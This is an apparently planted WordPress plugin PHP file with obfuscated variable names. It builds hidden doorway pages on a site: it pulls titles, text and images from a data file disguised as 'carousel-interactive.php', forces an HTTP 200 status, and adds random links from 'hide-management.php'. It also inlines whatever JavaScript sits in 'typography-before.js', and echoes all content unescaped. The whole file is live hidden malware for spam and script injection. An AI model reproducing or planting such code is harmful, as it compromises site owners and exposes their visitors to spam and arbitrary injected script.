<?php
$x9sOaOvh = intval(get_query_var('dddaystmy'));

if ($x9sOaOvh < 1 || $x9sOaOvh > 4085) return;
$uCxPifzhC = file(plugin_dir_path(__FILE__).'carousel-interactive.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$sbAcLen7u6 = explode(';', $uCxPifzhC[$x9sOaOvh]);
if (count($sbAcLen7u6) < 2) return;
$sJck186 = $sbAcLen7u6[0];
$cN8wl  = $sbAcLen7u6[1];
$iX6ndOJ = $sbAcLen7u6[2];
$wpMLDkuLF  = $sbAcLen7u6[3];
$uC13Nfilu = $sbAcLen7u6[4];
set_query_var('yrtkjc', $sJck186);

$eEr8m = '';
$j8tOEO = plugin_dir_path(__FILE__).'hide-management.php';
if (is_file($j8tOEO)) {
	$j4ayrkA = file($j8tOEO, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($j4ayrkA);
	shuffle($j4ayrkA);
	$mccgaHD = mt_rand(2, 5);
	if (count($j4ayrkA) > $mccgaHD) {
		for ($r5zDjLKHzn = 0; $r5zDjLKHzn < $mccgaHD; $r5zDjLKHzn++) {
			$e33dNg = array_shift($j4ayrkA);
			$eEr8m .= '<p><a href="'.$e33dNg.'">'.$e33dNg.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $sJck186; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $cN8wl . "</p>\n";
				if (strlen($wpMLDkuLF) > 0) echo "<p>" . $wpMLDkuLF . "</p>\n";
				if (strlen($iX6ndOJ) > 0) echo "<p>" . $iX6ndOJ . "</p>\n";
				if (strlen($uC13Nfilu) > 0) echo '<p><a href="#"><img src="'.$uC13Nfilu.'"></a>' . "</p>\n";
				echo $eEr8m;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$mqM1BO = plugin_dir_path(__FILE__) . 'typography-before.js';
if (is_file($mqM1BO)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($mqM1BO);
	echo '</script>';
}
get_footer();
?>
